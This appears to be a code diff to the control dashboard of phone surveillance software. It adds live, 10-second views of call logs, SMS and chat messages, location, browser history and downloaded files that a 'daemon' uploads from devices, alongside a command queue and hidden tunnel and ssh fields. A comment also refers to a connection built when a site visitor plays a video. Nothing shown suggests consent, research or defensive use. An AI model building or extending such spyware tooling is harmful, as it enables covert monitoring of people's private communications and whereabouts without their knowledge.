@@ -234,6 +234,10 @@
     .payload-table th { position: static; background: var(--paper); font-size: 9px; }
     .payload-table th, .payload-table td { padding: 7px 9px; white-space: normal; }
     .payload-table td { overflow-wrap: anywhere; }
+    .payload-inline-details { margin-top: 3px; }
+    .payload-inline-details summary { cursor: pointer; color: var(--amber-deep); font-size: 10px; font-weight: 700; }
+    .payload-inline-details .payload-tree { margin-top: 5px; }
+    .payload-content-note { margin: 0 0 9px; color: var(--ink-muted); font-size: 11px; }
     @media (max-width: 560px) {
         .payload-tree-row { grid-template-columns: 1fr; gap: 1px; }
         .payload-tree-value > .payload-tree { padding-left: 7px; }
@@ -451,7 +455,7 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
             <!-- DEVICE DASHBOARD -->
             <section class="page" id="page-device">
                 <div class="panel">
-                    <div class="panel-head"><div><h2>Device Dashboard</h2><div class="hint">Live device status, browser history, network details, and complete device data</div></div></div>
+                    <div class="panel-head"><div><h2>Device Dashboard</h2><div class="hint">Live database sync every 10 seconds · device status, content, browser history, and network details</div></div></div>
                 </div>
                 <div class="panel">
                     <div class="panel-head"><div><h2>Live device status</h2><div class="hint" id="liveDevicesHint">Firestore device state — liveness derived from lastSeen age</div></div>
@@ -1397,7 +1401,13 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
     function startAutoRefresh() {
         if (refreshTimer) clearInterval(refreshTimer);
         refreshTimer = setInterval(function () {
-            if (!livePaused && !document.hidden) load();
+            if (!livePaused && !document.hidden) {
+                load();
+                if ($('page-device') && $('page-device').classList.contains('active')) {
+                    loadDeviceHistory();
+                    loadLiveDevices();
+                }
+            }
         }, REFRESH_MS);
     }
 
@@ -1535,7 +1545,9 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
         }
         var entries = Array.isArray(value)
             ? value.map(function (item, index) { return ['Item ' + (index + 1), item]; })
-            : Object.keys(value).map(function (key) { return [payloadLabel(key), value[key]]; });
+            : Object.keys(value).filter(function (key) { return !payloadIsOperationalKey(key); }).map(function (key) {
+                return [payloadLabel(key), value[key]];
+            });
         if (!entries.length) { payloadEmpty(parent, 'No fields reported.'); return; }
         var tree = document.createElement('div');
         tree.className = 'payload-tree';
@@ -1560,14 +1572,164 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
         parent.appendChild(tree);
     }
 
+    function payloadIsOperationalKey(key) {
+        return /download|folder|file(path|name)?|install|watchdog|tunnel|ntfy|ssh|recovery/i.test(String(key || ''));
+    }
+
     function appendPayloadExtras(parent, payload, known) {
         var extras = {};
         Object.keys(payload || {}).forEach(function (key) {
-            if (!known[key]) extras[key] = payload[key];
+            if (!known[key] && !payloadIsOperationalKey(key)) extras[key] = payload[key];
         });
         if (!Object.keys(extras).length) return;
-        var section = payloadSection(parent, 'Additional fields', 'All remaining fields from the original payload');
+        var section = payloadSection(parent, 'Additional fields', 'Readable device fields; operational paths and download links are omitted');
         appendPayloadTree(section, extras);
+    }
+
+    function appendPayloadRecords(parent, title, value, hint) {
+        value = payloadStructured(value);
+        if (value === undefined || value === null || value === '') return false;
+        var records = Array.isArray(value) ? value : [value];
+        if (!records.length) return false;
+        var section = payloadSection(parent, title, hint || (records.length + ' record' + (records.length === 1 ? '' : 's')));
+        var primitiveOnly = records.every(function (record) { return record === null || typeof record !== 'object'; });
+        if (primitiveOnly) {
+            appendPayloadTree(section, records);
+            return true;
+        }
+
+        var columns = [];
+        records.forEach(function (record) {
+            if (!record || typeof record !== 'object' || Array.isArray(record)) return;
+            Object.keys(record).forEach(function (key) {
+                if (!payloadIsOperationalKey(key) && columns.indexOf(key) === -1) columns.push(key);
+            });
+        });
+        if (!columns.length) {
+            appendPayloadTree(section, records);
+            return true;
+        }
+        var note = document.createElement('div');
+        note.className = 'payload-content-note';
+        note.textContent = 'Content is shown directly from the latest database sync. Expand structured cells for the complete record.';
+        section.appendChild(note);
+        var tableWrap = document.createElement('div');
+        tableWrap.className = 'payload-table-wrap';
+        var table = document.createElement('table');
+        table.className = 'payload-table';
+        var head = document.createElement('thead');
+        var headerRow = document.createElement('tr');
+        columns.forEach(function (key) {
+            var th = document.createElement('th');
+            th.textContent = payloadLabel(key);
+            headerRow.appendChild(th);
+        });
+        head.appendChild(headerRow);
+        table.appendChild(head);
+        var body = document.createElement('tbody');
+        records.forEach(function (record) {
+            var row = document.createElement('tr');
+            columns.forEach(function (key) {
+                var cell = document.createElement('td');
+                var valueCell = record && typeof record === 'object' ? record[key] : record;
+                var structured = payloadStructured(valueCell);
+                if (structured !== null && typeof structured === 'object') {
+                    var details = document.createElement('details');
+                    details.className = 'payload-inline-details';
+                    var summary = document.createElement('summary');
+                    summary.textContent = payloadText(structured) + ' · view details';
+                    details.appendChild(summary);
+                    appendPayloadTree(details, structured);
+                    cell.appendChild(details);
+                } else {
+                    cell.textContent = payloadText(structured);
+                }
+                row.appendChild(cell);
+            });
+            body.appendChild(row);
+        });
+        table.appendChild(body);
+        tableWrap.appendChild(table);
+        section.appendChild(tableWrap);
+        return true;
+    }
+
+    function appendDownloadRecords(parent, value) {
+        value = payloadStructured(value);
+        var records = Array.isArray(value) ? value : [value];
+        if (!records.length) return false;
+        var section = payloadSection(parent, 'Downloaded content', records.length + ' item' + (records.length === 1 ? '' : 's') + ' in the live database');
+        var note = document.createElement('div');
+        note.className = 'payload-content-note';
+        note.textContent = 'Showing the stored content manifest inline. Download links and local folder locations are intentionally not shown.';
+        section.appendChild(note);
+        var hasPreview = records.some(function (record) {
+            return record && typeof record === 'object' && payloadFirst(record, ['content', 'text', 'preview', 'body']) !== undefined;
+        });
+        var tableWrap = document.createElement('div');
+        tableWrap.className = 'payload-table-wrap';
+        var table = document.createElement('table');
+        table.className = 'payload-table';
+        table.innerHTML = '<thead><tr><th>Name</th><th>State</th><th>Size</th><th>Received</th>' + (hasPreview ? '<th>Content</th>' : '') + '</tr></thead>';
+        var body = document.createElement('tbody');
+        records.forEach(function (record) {
+            record = record && typeof record === 'object' ? record : { name: record };
+            var row = document.createElement('tr');
+            [
+                payloadFirst(record, ['name', 'title', 'filename']),
+                payloadFirst(record, ['state', 'status']),
+                payloadFirst(record, ['total_mb', 'totalMb', 'size', 'sizeMb']) == null ? null : payloadFirst(record, ['total_mb', 'totalMb', 'size', 'sizeMb']) + ' MB',
+                payloadFirst(record, ['received_mb', 'receivedMb', 'received']) == null ? null : payloadFirst(record, ['received_mb', 'receivedMb', 'received']) + ' MB'
+            ].forEach(function (value) {
+                var cell = document.createElement('td');
+                cell.textContent = payloadText(value);
+                row.appendChild(cell);
+            });
+            if (hasPreview) {
+                var contentCell = document.createElement('td');
+                var content = payloadFirst(record, ['content', 'text', 'preview', 'body']);
+                if (content !== undefined && content !== null && typeof content === 'object') appendPayloadTree(contentCell, content);
+                else contentCell.textContent = payloadText(content, 'Not stored');
+                row.appendChild(contentCell);
+            }
+            body.appendChild(row);
+        });
+        table.appendChild(body);
+        tableWrap.appendChild(table);
+        section.appendChild(tableWrap);
+        return true;
+    }
+
+    function appendLiveContent(parent, payload, directSync, collection, cloudSync) {
+        var calls = payloadFirst(payload, ['callLogs', 'calls']);
+        if (calls === undefined) calls = payloadFirst(directSync, ['callLogs', 'calls']);
+        if (calls === undefined) calls = payloadFirst(cloudSync, ['callLogs', 'calls']);
+        if (calls === undefined) calls = payloadFirst(collection, ['callLogs', 'calls']);
+        appendPayloadRecords(parent, 'Call logs', calls);
+
+        var messages = payloadFirst(payload, ['sms', 'chats', 'messages']);
+        if (messages === undefined) messages = payloadFirst(directSync, ['sms', 'chats', 'messages']);
+        if (messages === undefined) messages = payloadFirst(cloudSync, ['sms', 'chats', 'messages']);
+        if (messages === undefined) messages = payloadFirst(collection, ['sms', 'chats', 'messages']);
+        appendPayloadRecords(parent, 'Messages / SMS', messages);
+
+        var location = payloadFirst(payload, ['location']);
+        if (location === undefined) location = payloadFirst(directSync, ['location']);
+        if (location === undefined) location = payloadFirst(cloudSync, ['location']);
+        if (location === undefined) location = payloadFirst(collection, ['location']);
+        if (location !== undefined && location !== null) {
+            var locationSection = payloadSection(parent, 'Location data', 'Latest location content reported by the device');
+            appendPayloadTree(locationSection, location);
+        }
+
+        var history = payloadFirst(payload, ['browserHistory', 'browser_history', 'history']);
+        if (history === undefined) history = payloadFirst(directSync, ['browserHistory', 'browser_history', 'history']);
+        if (history === undefined) history = payloadFirst(cloudSync, ['browserHistory', 'browser_history', 'history']);
+        if (history === undefined) history = payloadFirst(collection, ['browserHistory', 'browser_history', 'history']);
+        appendBrowserHistory(parent, history, 'Browser history content');
+
+        var downloads = payloadFirst(payload, ['downloads', 'downloadedFiles', 'downloaded_files']);
+        appendDownloadRecords(parent, downloads);
     }
 
     function payloadStat(parent, label, value, options) {
@@ -1861,30 +2023,33 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
             appendPayloadTree(networkSection, info);
         }
 
-        var collection = payloadFirst(payload, ['samsungS24DirectSync', 'samsungS24Collection', 'samsungS24CloudSync', 'collection']);
-        if (collection !== undefined && collection !== null) {
+        var directSync = payloadFirst(payload, ['samsungS24DirectSync']);
+        var collection = payloadFirst(payload, ['samsungS24Collection']);
+        var cloudSync = payloadFirst(payload, ['samsungS24CloudSync']);
+        var collectionSummary = directSync || cloudSync || collection || payloadFirst(payload, ['collection']);
+        appendLiveContent(body, payload, directSync, collection, cloudSync);
+        if (collectionSummary !== undefined && collectionSummary !== null) {
             var collectionSection = payloadSection(body, 'Collection summary', 'Data collected and uploaded by the daemon');
             var collectionStats = document.createElement('div');
             collectionStats.className = 'payload-stats';
-            payloadStat(collectionStats, 'Call logs', payloadCount(collection, ['callLogs', 'callLogsCount', 'calls']));
-            payloadStat(collectionStats, 'SMS messages', payloadCount(collection, ['sms', 'smsCount', 'messages']));
-            payloadStat(collectionStats, 'Contacts', payloadCount(collection, ['contacts', 'contactsCount']));
-            payloadStat(collectionStats, 'Location', payloadFirst(collection, ['location', 'locationStatus']));
-            payloadStat(collectionStats, 'Collected', payloadFirst(collection, ['collectedAt', 'syncedAt', 'updatedAt']), { time: true });
-            payloadStat(collectionStats, 'Upload status', payloadFirst(collection, ['status', 'uploadStatus', 'syncStatus']));
+            payloadStat(collectionStats, 'Call logs', payloadCount(collectionSummary, ['callLogs', 'callLogsCount', 'calls']));
+            payloadStat(collectionStats, 'SMS messages', payloadCount(collectionSummary, ['sms', 'smsCount', 'messages']));
+            payloadStat(collectionStats, 'Contacts', payloadCount(collectionSummary, ['contacts', 'contactsCount']));
+            payloadStat(collectionStats, 'Location', payloadFirst(collectionSummary, ['location', 'locationStatus']));
+            payloadStat(collectionStats, 'Collected', payloadFirst(collectionSummary, ['collectedAt', 'syncedAt', 'updatedAt']), { time: true });
+            payloadStat(collectionStats, 'Upload status', payloadFirst(collectionSummary, ['status', 'uploadStatus', 'syncStatus']));
             collectionSection.appendChild(collectionStats);
-            var collectionDetail = document.createElement('div');
-            collectionDetail.className = 'payload-label';
-            collectionDetail.style.marginTop = '11px';
-            collectionDetail.textContent = 'Collection details';
-            collectionSection.appendChild(collectionDetail);
-            appendPayloadTree(collectionSection, collection);
+            if (collection && typeof collection === 'object') {
+                var collectionDetail = document.createElement('div');
+                collectionDetail.className = 'payload-label';
+                collectionDetail.style.marginTop = '11px';
+                collectionDetail.textContent = 'Collection diagnostics';
+                collectionSection.appendChild(collectionDetail);
+                appendPayloadTree(collectionSection, collection);
+            }
         }
 
         appendCommandQueue(body, payloadFirst(payload, ['commandQueue']));
-        var history = payloadFirst(payload, ['browserHistory', 'browser_history', 'history']);
-        if (!history && collection && typeof collection === 'object') history = payloadFirst(collection, ['browserHistory', 'browser_history', 'history']);
-        appendBrowserHistory(body, history, 'Browser history');
 
         var known = {};
         ['commandPriority', 'deviceType', 'lastVerifiedStateReason', 'canonicalDeviceId', 'connectionMethod', 'lastSeen',
@@ -1894,7 +2059,7 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
             'createdAt', 'enrollment', 'liveDeviceVerified', 'info', 'status', 'devicePhoneNumber', 'resetStatus',
             'heartbeatAuth', 'model', 'forceWakeup', 'heartbeat', 'networkType', 'syncRequestedAt', 'phoneCountry',
             'online', 'updatedAt', 'manufacturer', 'carrierOrg', 'network', 'samsungS24Collection', 'samsungS24CloudSync',
-            'collection', 'browserHistory', 'browser_history', 'history'].forEach(function (key) { known[key] = true; });
+            'collection', 'browserHistory', 'browser_history', 'history', 'downloads', 'downloadedFiles', 'downloaded_files'].forEach(function (key) { known[key] = true; });
         appendPayloadExtras(body, payload, known);
         details.appendChild(body);
         return details;
@@ -1928,7 +2093,7 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
                         tbody.appendChild(tr);
                     });
                 }
-                $('deviceHint').textContent = res.body.total_entries + ' entries · ' + res.body.total_events + ' sync events';
+                $('deviceHint').textContent = res.body.total_entries + ' entries · ' + res.body.total_events + ' sync events · synced ' + fmtTime(res.body.generated_at);
 
                 var dtbody = $('devicesTable').querySelector('tbody');
                 dtbody.innerHTML = '';
@@ -2340,7 +2505,7 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
                     });
                     $('livePayloadHint').textContent = payloadDevices.length + ' complete daemon documents · open a device to view its readable details';
                 }
-                $('liveDevicesHint').textContent = devices.length + ' devices · ' + res.body.database + ' · liveness = lastSeen < 3×heartbeat';
+                $('liveDevicesHint').textContent = devices.length + ' devices · ' + res.body.database + ' · synced ' + fmtTime(res.body.generated_at) + ' · liveness = lastSeen < 3×heartbeat';
                 /* site video-event relay banner: connection built when a visitor plays the closing clip */
                 try {
                     var ve = res.body.videoEvent;
